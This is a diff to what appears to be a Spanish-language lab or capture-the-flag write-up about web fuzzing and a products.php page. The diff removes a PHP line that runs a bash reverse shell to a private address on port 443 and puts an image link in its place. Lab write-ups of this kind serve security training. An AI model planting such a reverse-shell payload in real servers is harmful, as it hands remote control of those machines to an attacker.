@@ -63,9 +63,7 @@ hice fuzzing web y encontramos un /productos.php entonces con la conexion ssh qu
 
 ![alt text](image-12.png)
 
-<?php 
-	exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.3/443 0>&1' ");
-?>
+![alt text](image-14.png)
 
 ![alt text](image-13.png)
 
